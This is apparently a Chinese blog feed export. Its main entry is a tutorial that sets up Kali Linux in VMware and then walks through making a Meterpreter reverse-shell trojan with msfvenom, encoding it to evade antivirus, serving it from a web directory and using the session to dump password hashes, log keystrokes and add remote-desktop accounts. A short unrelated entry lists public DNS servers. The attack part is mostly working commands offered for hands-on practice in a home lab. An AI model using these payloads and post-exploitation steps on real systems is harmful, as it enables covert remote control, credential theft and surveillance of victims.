<p>此处提供所有版本iso的下载网盘链接<br> 链接：<a href="http://pan.baidu.com/s/1o79xFyM" target="_blank" rel="external">http://pan.baidu.com/s/1o79xFyM</a> 密码：bm73<br> 我安装的是kali-linux-light-2016.2-amd64版本</p>
</blockquote>
<h3 id="VMware安装之后（下面是VM10-0的教程与最新版本差不多）"><a href="#VMware安装之后（下面是VM10-0的教程与最新版本差不多）" class="headerlink" title="VMware安装之后（下面是VM10.0的教程与最新版本差不多）"></a>VMware安装之后（下面是VM10.0的教程与最新版本差不多）</h3><p>3）启动VMware Workstation，将显示如图所示的界面。</p>
<p><img src="http://img.blog.csdn.net/20170325203916495?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="VMware Workstation启动界面"></p>
<p>（4）从该界面可以看到，有六个图标可以点击。这里单击“创建新的虚拟机”图标，将显示如图所示的界面。</p>
<p>（5）从该界面可以看到，显示了两种安装类型，分别是“典型”和“自定义”。如果使用“自定义”类型安装的话，用户还需要手动设置其它配置。这里推荐使用“典型”的类型，然后单击“下一步”按钮，将显示如图所示的界面。</p>
<p><img src="http://img.blog.csdn.net/20170325203945214?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="新建虚拟机向导&amp;安装客户机操作系统">                 </p>
<p>（6）该界面选择安装客户机操作系统的方式。从该界面可以看到，提供了三种方法。这里选择使用“稍后安装操作系统（S）”选项，然后单击“下一步”按钮，将显示如图所示的界面。</p>
<p>（7）在该界面选择安装的操作系统和版本。这里选择Linux操作系统，版本为“其它Linux 3.X内核64位”，然后单击“下一步”按钮，将显示如图所示的界面。</p>
<p><img src="http://img.blog.csdn.net/20170325204001341?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="选择客户机操作系统&amp;命名虚拟机">                   </p>
<p>（8）在该界面为虚拟机创建一个名称，并设置虚拟机的安装位置。设置完成后，单击“下一步”按钮，将显示如图所示的界面。</p>
<p>（9）在该界面设置磁盘的容量。如果当前主机有足够大的磁盘时，建议设置的磁盘容量大点，避免造成磁盘容量不足。这里设置为80GB(PS:建议设置为20-40G之间的值)，然后单击“下一步”按钮，将显示如图所示的界面。</p>
<p><img src="http://static.oschina.net/uploads/space/2015/0324/155309_hhkz_1585857.png" alt="指定磁盘容量&amp;已准备好创建虚拟机"></p>
<p>（10）该界面显示了所创建虚拟机的详细信息，此时就可以创建操作系统了。然后单击“完成”按钮，将显示如图所示的界面。</p>
<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_ejOb_1585857.png" alt="创建虚拟机"></p>
<p>（11）该界面显示了新创建的虚拟机的详细信息。接下来就可以准备安装Kali Linux1.0.5操作系统了。但是，在安装Kali Linux之前需要设置一些信息。在VMware Workstation窗口中单击“编辑虚拟机设置”，将显示如图所示的界面。</p>
<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_H384_1585857.png" alt="虚拟机设置"></p>
<p>（12）在该界面可以设置内存、处理器、网络适配器等。将这些硬件配置好后，选择“CD/DVD（IDE）”选项，将显示如图所示的界面。</p>
<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_0cj5_1585857.png" alt="选择ISO映像文件"></p>
<p>（13）在该界面的右侧选择“使用ISO映像文件”复选框，并单击“浏览”按钮，选择Kali Linux1.0.5的映像文件。然后单击“确定”按钮，将返回到图所示的界面。此时，就可以开始安装Kali Linux操作系统。</p>
<p>（14）在图中单击“开启此虚拟机”命令，将显示一个新的窗口，如图所示。</p>
<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_ePcN_1585857.png" alt="安装界面"></p>
<p>（15）此时，就可以在VMware Workstation上安装Kali Linux操作系统了本文选自Kali Linux无线网络渗透测试教程。</p>
<h3 id="运行Kali-Linux虚拟机并在系统内安装的教程"><a href="#运行Kali-Linux虚拟机并在系统内安装的教程" class="headerlink" title="运行Kali Linux虚拟机并在系统内安装的教程"></a>运行Kali Linux虚拟机并在系统内安装的教程</h3><blockquote>
<p>此处可见官方教程（硬盘安装Kali Linux）<br>当然我们是加载iso镜像文件 实质上相当于插入了一个硬盘<br>-<a href="http://cn.docs.kali.org/installing-kali-linux-cn/%E7%A1%AC%E7%9B%98%E5%AE%89%E8%A3%85kali-linux" target="_blank" rel="external">具体操作请见官方安装Kali-linux的文档</a></p>
</blockquote>
<h3 id="Kali-linux系统装完后启动，进行进一步配置"><a href="#Kali-linux系统装完后启动，进行进一步配置" class="headerlink" title="Kali-linux系统装完后启动，进行进一步配置"></a>Kali-linux系统装完后启动，进行进一步配置</h3><ul>
<li>解决中文显示乱码问题：<br>第一步: 打开系统的命令行 键入<br><code>apt-get install ttf-wqy-*</code><br>安装好之前缺失的中文语言包,再输入<br><code># echo LANG=&quot;zh_CN.UTF-8&quot; &gt; /etc/default/locale</code>,回车执行，再执行<code>reboot</code>重启即可。<blockquote>
<p>若中文乱码问题还未完全解决，进行下一步尝试:<br>  <code>dpkg-reconfigure locales</code><br>  选择字符编码：en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8<br>  选择字符：zh_CN.UTF-8（记得用空格）<br>  设置完后重启<code>reboot</code><br>更新软件源，借用国内镜像使下载速度更快：<br>直接打开<code>/etc/apt/sources.list</code>或者先<br><code>apt-get install leafpad</code>下载安装编辑器leafpad<br>然后在sources.list文件里添加下面的东西：<br><code>deb http://http.kali.org/kali kali main non-free contrib
  deb-src http://http.kali.org/kali kali main non-free contrib
  deb http://security.kali.org/kali-security kali/updates main contrib non-free
  deb http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib 
  deb-src http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib 
  deb http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib 
  deb-src http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib 
  deb http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib 
  deb-src http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib 
  deb http://mirrors.163.com/debian wheezy main non-free contrib 
  deb-src http://mirrors.163.com/debian wheezy main non-free contrib 
  deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib 
  deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib 
  deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib 
  deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib</code><br>  再执行<code>apt-get update</code>更新软件源</p>
</blockquote>
</li>
</ul>
<blockquote>
<p> 下面这些仅供参考，都是很有用的工具,可以下载一下:<br>   安装中文字体和五笔拼音输入法：<br>    <code>apt-get install fcitx-table-wbpy ttf-wqy-microhei ttf-wqy-zenhei</code><br>    重新登录后使用im-config启用fcitx<br>    运行Fcitx Configuration，在Input Method中添加输入法。<br>    安装Flash插件：<br>    <code>apt-get install flashplugin-nonfree</code><br>    <code>update-flashplugin-nonfree --install</code><br>    安装原版Firefox方法：<br>    2013年7月16日，iceweasel终于更新到22.0了。<br>    Firefox已经更新到20，我很喜欢它的新下载管理器，可惜iceweasel版本还是停留在18.01，so。。。<br>    <code>apt-get remove iceweasel</code><br>    <code>echo -e &quot;\ndeb http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt all main&quot; | sudo tee -a /etc/apt/sources.list &gt; /dev/null
    apt-key adv --recv-keys --keyserver keyserver.ubuntu.com C1289A29
    apt-get update
    apt-get firefox-mozilla-build</code><br>    安装几个我常用的小工具：<br>    <code>apt-get install i nethogs aria2</code><br>    安装”Open In Terminal”的快捷方式<br>    <code>apt-get install nautilus-open-terminal</code><br>    安装远程桌面管理工具：<br>    <code>apt-get install gtk-recordmydes recordmydes remmina</code><br>    Deb包图形安装工具：<br>    <code>apt-get install gdebi</code><br>    压缩文件管理工具及解压缩工具：<br>    <code>apt-get install unrar unace rar unrar p7zip zip unzip p7zip-full p7zip-rar file-roller</code><br>    Gnome3优化设置工具：<br>    <code>apt-get install gnome-tweak-tool</code><br>    新立得，用过老版ubuntu的都知道：<br>    <code>apt-get install synaptic</code><br>    Shadowsocks的Linux客户端：<br>    <code>apt-get install python-twisted-core python-gtk2 python-m2crypto
    pip install shadowsocks-gtk</code><br>    安装Ubuntu软件中心Software Center：<br>    <code>apt-get install software-center</code><br>    安装wicd，它可是比系统自带的network-manager好用多了：<br>    <code>apt-get install wicd</code><br>    <code>#/etc/init.d/network-manager</code><br>    停用network-manager<br>    <code>update-rc.d network-manager disable</code>    //禁止network-manager开机启动<br>    wicd-client                                                 //启动wicd<br>    Netspeed，可以显示当前网络上传下载速度的GNOME applet：<br>    <code>apt-get install netspeed</code><br>    Alt+鼠标右键选择Add to Panel<br>    Python类工具需要：<br>    <code>apt-get install python-dev python-greenlet python-gevent python-vte python-openssl python-crypto python-appindicator libnss3-tools</code><br>    安装pip，方便升级gevent1.0：<br>    <code>apt-get install python-setuptools</code><br>    <code>easy_install pip</code><br>    <code>pip install setuptools --no-use-wheel --upgrade</code>  //提示setuptools版本错误时执行<br>    <code>pip install gevent --upgrade</code><br>    Armitage是metasploit的图形界面，适合新手搞研究：<br>    <code>apt-get install armitage</code><br>    Postgresql和metasploit开机时自动启动：<br>    <code>update-rc.d postgresql enable &amp;&amp; update-rc.d metasploit enable</code><br>    fern-wifi-cracker更新后无法启动，解决方法是：<br>    <code>chmod +x /usr/share/fern-wifi-cracker/execute.py</code><br>    在使用minidwep-gtk类软件搞研究前，要先停用network-manager，不停用的话扫不到几个信号，虚拟机或有网线连接的用户应该没有这个烦恼：<br>    <code>#/etc/init.d/network-manager</code><br>    解决音量设置无法保存：<br>    `</p>
<pre><code>#apt-get install alsa-utils
#alsactl store
`
目前发现Linux平台非常好用的视频播放器：
基于mplayer/mplayer2的mpv，就算是没有标准的gui界面：
`apt-get install mpv`
</code></pre></blockquote>
<h2 id="Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷"><a href="#Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷" class="headerlink" title="Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷"></a>Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷</h2><blockquote>
<p>说简单点，就是我们要开始来制作木马了</p>
<h3 id="先简单看一下我们要用到的msfvenom库吧"><a href="#先简单看一下我们要用到的msfvenom库吧" class="headerlink" title="先简单看一下我们要用到的msfvenom库吧"></a>先简单看一下我们要用到的msfvenom库吧</h3><p>  2015年6月8日，Wei Chen在rapid7官方博客上发文，将于近期移除metasploit-framework版本中的msfencoder和msfpayload，并使用msfvenom取代。官方的msfvenom使用说明戳这里，下面给出翻译的使用说明。<br>  <img src="http://www.2cto.com/uploadfile/Collfiles/20150714/20150714102041606.png" alt=""></p>
<h3 id="msfvenom使用简介"><a href="#msfvenom使用简介" class="headerlink" title="msfvenom使用简介"></a>msfvenom使用简介</h3><pre><code>最近一次更新的msf中已经去掉了这两个工具，同时，msfcli也即将被移除。
</code></pre><p><img src="http://www.2cto.com/uploadfile/Collfiles/20150714/20150714102041611.png" alt=""><br>    msfvenom使用简介<br>    kali和BT目前使用的MSF依然是旧版，所以用kali和BT5的小伙伴可以暂时不考虑。在其他平台上编译安装msf的童鞋，可能已经发现这个东西了。<br><img src="http://www.2cto.com/uploadfile/Collfiles/20150714/20150714102041612.png" alt=""><br>    msfvenom使用简介<br>    msfvenom命令行选项如下：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">-p, --payload    payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&apos;-&apos;或者stdin指定</div><div class="line">-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</div><div class="line">-n, --nopsled    length&gt;        为payload预先指定一个NOP滑动长度</div><div class="line">-f, --format     format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</div><div class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</div><div class="line">-a, --arch       architecture&gt;  指定payload的目标架构</div><div class="line">    --platform   platform&gt;      指定payload的目标平台</div><div class="line">-s, --space      length&gt;        设定有效攻击荷载的最大长度</div><div class="line">-b, --bad-chars  list&gt;          设定规避字符集，比如: &apos;\x00\xff&apos;</div><div class="line">-i, --iterations count&gt;         指定payload的编码次数</div><div class="line">-c, --add-code   path&gt;          指定一个附加的win32 shellcode文件</div><div class="line">-x, --template   path&gt;          指定一个自定义的可执行文件作为模板</div><div class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</div><div class="line">    --payload-options            列举payload的标准选项</div><div class="line">-o, --out   path&gt;               保存payload</div><div class="line">-v, --var-name name&gt;            指定一个自定义的变量，以确定输出格式</div><div class="line">    --shellest                   最小化生成payload</div><div class="line">-h, --help                       查看帮助选项</div><div class="line">    --help-formats</div></pre></td></tr></table></figure></p>
<p> 查看msf支持的输出格式列表<br>    生成payload<br>    生成payload，有有两个必须的选项：-p -f<br>    使用-p 来指定要使用的payload。<br>    可以使用下面的命令来查看所有msf可用的payload列表<br>    <code>./msfvenom -l payloads</code><br>    -p选项也支持使用使用自定义的payload，需要使用 “-“，比如:<br>    <code>cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw</code><br>    使用-f 来指定payload的输出格式<br>    举例：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -f exe</code><br>    使用下面的命令，可以产看msf支持的输出格式<br>    <code>./msfvenom --help-formats</code><br>    一个典型的msfvenom使用举例如下：<br>    <code>$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#39;s IP] lport=4444 -f exe -o /tmp/my_payload.exe</code><br>    对payload进行编码<br>    如果你使用了-b选项（设定了规避字符集），会自动调用编码器。<br>    其他情况下，你需要使用-e选项来使用编码模块，例如：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</code><br>    可以使用下面的命令，来查看可用的编码器<br>    <code>./msfvenom -l encoders</code><br><strong>你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案。</strong><br>可以使用下面的命令来进行迭代编码：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</code><br>    规避字符<br>    使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -b &#39;\x00&#39; -f raw</code><br>    使用自定义可执行文件模板<br>    默认的，msfvenom使用的模板文件保存在msf/data/templates目录中，如果你想使用你自己的模板文件，你可以使用-x选项来指定，比如：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe</code><br>    这个命令将使用windows下计算器程序（calc.exe）作为可执行文件的模板生成payload。<br>    注意：如果你想要创建一个windows的x64的可执行文件模板来生成一个x64的payload，你只能使用exe格式的模板。<br>    使用-x选项经常和-k选项配合使用，-k选项会将你的payload作为一个新的进程运行。但目前这个选项只支持老版本的windows系统比如windows xp</p>
</blockquote>
<p><strong>Windows7(经测试，也适用于win8,win10) kali Linux工具    metasploit</strong></p>
<h3 id="在虚拟机运行kalilinux以及Windows7然后开始监听目标主机"><a href="#在虚拟机运行kalilinux以及Windows7然后开始监听目标主机" class="headerlink" title="在虚拟机运行kalilinux以及Windows7然后开始监听目标主机"></a>在虚拟机运行kalilinux以及Windows7然后开始监听目标主机</h3><blockquote>
<p> 终端输入<br>    <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=8080 -f exe &gt;/var/www/html/b.exe chmod -R 777 /var/www/html/</code><br>    打开metasploit<br>    msfconsole<br>    加载利用模块监听目标主机ip 192.168.1.7，端口8080执行<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOADS windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.1.7</div><div class="line">set LPORT 8080</div><div class="line">exploit`</div><div class="line">`sessions -i 1 //打开建立的第一个会话</div><div class="line">getuid //查看UID</div><div class="line">sysinfo //查看攻击主机的系统信息</div><div class="line">run hashdump //dump目标主机的hash帐号信息，备份进行暴破</div><div class="line">ps //查看目标主机进程</div><div class="line">migrate 1576(pid) //切换自己为管理员，1576是管理员的进程ID</div><div class="line">getuid</div><div class="line">keyscan_start //开启健盘记录功能</div><div class="line">keyscan_dump //查看健盘记录信息</div><div class="line">keyscan_stop //停止健盘记录</div><div class="line">run getgui -e //远程开启目标主机的远程桌面</div><div class="line">run getgui -u cisco -p cisco //远程添加目标主机帐号密码</div><div class="line">rdesktop 192.168.1.100 //远程桌面</div></pre></td></tr></table></figure></p>
<p>   现在到Windows7(win8,win10)创建自解压文件<br>    进入高级选项<br>    在文字提示窗口输入恶意代码如下<br>    然后一直确定就会出现一个文件名称中带有sfx的可执行文件，双击执行之后kali Linux中一直监听目标机器的程序就会出现你目标主机的配置信息。</p>
</blockquote>
<h3 id="看了上面的教程，如果还觉得实战有问题的话，那就直接看-我的图片教程咯-从头开始创建一个小木马"><a href="#看了上面的教程，如果还觉得实战有问题的话，那就直接看-我的图片教程咯-从头开始创建一个小木马" class="headerlink" title="看了上面的教程，如果还觉得实战有问题的话，那就直接看    我的图片教程咯(从头开始创建一个小木马)"></a>看了上面的教程，如果还觉得实战有问题的话，那就直接看    我的图片教程咯(从头开始创建一个小木马)</h3><p><img src="http://img.blog.csdn.net/20170325192729117?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="先用ifconfig指令确定本机的IP 此处为 192.168.111.135"><br><img src="http://img.blog.csdn.net/20170325192831399?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="再用msfvenom指令生成木马"><br><strong>上面 -p用来指定payloads种类 一般攻击windows的用windows/meterpreter/reverse_tcp 然后LHOST设置IP LPORT设置端口(可以随意) 最后设置输出格式-f 为exe 保存为桌面的evil.exe</strong><br><img src="http://img.blog.csdn.net/20170325193034199?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="生成完毕,由于无指定platform 自动设置为windows CPU架构默认设置为x86 默认不使用编码器"><br><img src="http://img.blog.csdn.net/20170325193205603?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到这个exe就是我们生成的木马"><br><img src="http://img.blog.csdn.net/20170325193239682?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="启动监视窗口msfconsole"><br><img src="http://img.blog.csdn.net/20170325193317104?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="看到酷酷的图案以及出现msf&gt; 说明启动成功"><br><img src="http://img.blog.csdn.net/20170325193358604?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="设置监听的IP地址和端口(我们之前定义在木马上的)"><br><img src="http://img.blog.csdn.net/20170325193442933?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="输入exploit开始监听"></p>
<h3 id="启动的木马-实现控制"><a href="#启动的木马-实现控制" class="headerlink" title="启动的木马 实现控制"></a>启动的木马 实现控制</h3><blockquote>
<p>由于我的VMware安装TOOLs出现了意外，所以无法直接把木马文 件拖到windows上，因此自己用python写了个基于ssh协议的传输程序，可以很快地实现linux和windows的文件传输以及命令台控制(获取kali-linux的权限)<br><img src="http://img.blog.csdn.net/20170325193919822?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="然后用这个把木马传了过来"><br><img src="http://img.blog.csdn.net/20170325194041967?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到，evil.exe木马传过来了"><br><img src="http://img.blog.csdn.net/20170325194146937?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="运行后发现被360查杀,由于我们是做渗透测试，直接添加信任"><br><img src="http://img.blog.csdn.net/20170325194929539?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到运行后,kali-linux已经接收到信号了,出现meterpreter,说明可以远程控制了"><br><img src="http://img.blog.csdn.net/20170325195017149?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到各种控制指令"><br><img src="http://img.blog.csdn.net/20170325195048071?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="包括键盘记录，屏幕截图，远程视频等"><br><img src="http://img.blog.csdn.net/20170325195144651?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="获取对方电脑的进程，实现控制、停止和监听"><br><img src="http://img.blog.csdn.net/20170325195219582?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="arp攻击等"><br><img src="http://img.blog.csdn.net/20170325195259614?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="各种文件操作，包括下载和上传到被攻击的电脑，实现任意修改"><br><img src="http://img.blog.csdn.net/20170325195349099?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="获取对方的系统信息等"></p>
<h3 id="自己好好去实践玩一下吧"><a href="#自己好好去实践玩一下吧" class="headerlink" title="自己好好去实践玩一下吧"></a>自己好好去实践玩一下吧</h3><p>有任何问题可以在评论区留言，我会及时解答或订正。<br><img src="http://img.blog.csdn.net/20170401022928043?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 渗透笔记 </category>
            
            <category> 后台游戏 </category>
            
            <category> 作者:Hac </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Kali-linux </tag>
            
            <tag> Payloads </tag>
            
            <tag> Msfvenom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[(转)几个国内专用的公共 DNS]]></title>
      <url>http://yikunhaocong.com/2016/05/11/public-dns/</url>
      <content type="html"><![CDATA[<p>　　之前 <a href="http://www.bootcdn.cn/" target="_blank" rel="external">有个网站</a> 自己经常上不去，查了挺久才发现是 DNS 的问题，更换为公共 DNS 后访问恢复正常。由此可见，挑选一个合适自己网络的 DNS 还是挺有必要的。</p>
<a id="more"></a>
<h2 id="DNS-简介"><a href="#DNS-简介" class="headerlink" title="DNS 简介"></a>DNS 简介</h2><p>DNS 全称 <code>Domain Name System</code>，中文译为 <code>域名系统</code>，是因特网的一项服务，其域名服务器的分布式数据库中存储着因特网上域名和 IP 地址相互映射的关系，经解析器解析，使用户能够通过域名来访问互联网。</p>
<h2 id="114DNS"><a href="#114DNS" class="headerlink" title="114DNS"></a>114DNS</h2><pre><code>114.114.114.114
114.114.115.115
</code></pre><p><strong>官　网</strong>：<a href="http://www.114dns.com/" target="_blank" rel="external">http://www.114dns.com/</a><br><strong>关键词</strong>：权威，高速，稳定，可靠，无劫持，防钓鱼，防病毒</p>
<h2 id="阿里公共DNS"><a href="#阿里公共DNS" class="headerlink" title="阿里公共DNS"></a>阿里公共DNS</h2><pre><code>223.5.5.5
223.6.6.6
</code></pre><p><strong>官　网</strong>：<a href="http://www.alidns.com/" target="_blank" rel="external">http://www.alidns.com/</a><br><strong>关键词</strong>：快速，稳定，智能</p>
<h2 id="腾讯-Public-DNS"><a href="#腾讯-Public-DNS" class="headerlink" title="腾讯 Public DNS +"></a>腾讯 Public DNS +</h2><pre><code>119.29.29.29
</code></pre><p><strong>官　网</strong>：<a href="https://www.dnspod.cn/Products/Public.DNS" target="_blank" rel="external">https://www.dnspod.cn/Products/Public.DNS</a><br><strong>关键词</strong>：快速，准确，稳定</p>
<h2 id="百度公共DNS"><a href="#百度公共DNS" class="headerlink" title="百度公共DNS"></a>百度公共DNS</h2><pre><code>180.76.76.76
</code></pre><p><strong>官　网</strong>：<a href="http://dudns.baidu.com/intro/publicdns/" target="_blank" rel="external">http://dudns.baidu.com/intro/publicdns/</a><br><strong>关键词</strong>：云防护，无劫持，更精确</p>
<h2 id="oneDNS"><a href="#oneDNS" class="headerlink" title="oneDNS"></a>oneDNS</h2><pre><code>南方首选：112.124.47.27
北方首选：114.215.126.16
</code></pre><p><strong>官　网</strong>：<a href="http://www.onedns.net/" target="_blank" rel="external">http://www.onedns.net/</a><br><strong>关键词</strong>：安全，快速，恶意网站拦截，广告过滤，上网加速</p>
<h2 id="CNNIC-SDNS"><a href="#CNNIC-SDNS" class="headerlink" title="CNNIC SDNS"></a>CNNIC SDNS</h2><pre><code>1.2.4.8
210.2.4.8
</code></pre><p><strong>官　网：</strong><a href="http://public.sdns.cn/" target="_blank" rel="external">http://public.sdns.cn/</a><br><strong>关键词：</strong>权威，安全，智能，高速</p>
<h2 id="DNS-选用"><a href="#DNS-选用" class="headerlink" title="DNS 选用"></a>DNS 选用</h2><h3 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h3><ul>
<li>可以通过 <a href="http://www.webkaka.com/dns/" target="_blank" rel="external">在线小工具</a> 测试一下 DNS 的解析速度，结果可以作为参考<br><img src="/resources/dns-tool.png" alt="DNS Tool"></li>
</ul>
<h3 id="本地优选"><a href="#本地优选" class="headerlink" title="本地优选"></a>本地优选</h3><ul>
<li>下载 <a href="http://www.crsky.com/soft/88043.html" target="_blank" rel="external">魔方DNS助手</a>，可以方便地检测，选择和修改 DNS</li>
</ul>
<p><img src="/resources/dnshelper.png" alt="DNS Helper"></p>
<blockquote>
<p>如果更换 DNS 后网络异常，可以尝试 <a href="http://jingyan.baidu.com/article/6d704a13fb6e1828db51ca3a.html" target="_blank" rel="external">刷新本地的DNS缓存</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 来自MOxFIVE的优秀笔记 </category>
            
            <category> 网络应用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[(我转)Markdown 表格样式调整与自适应优化]]></title>
      <url>http://yikunhaocong.com/2016/03/04/markdown-table-style/</url>
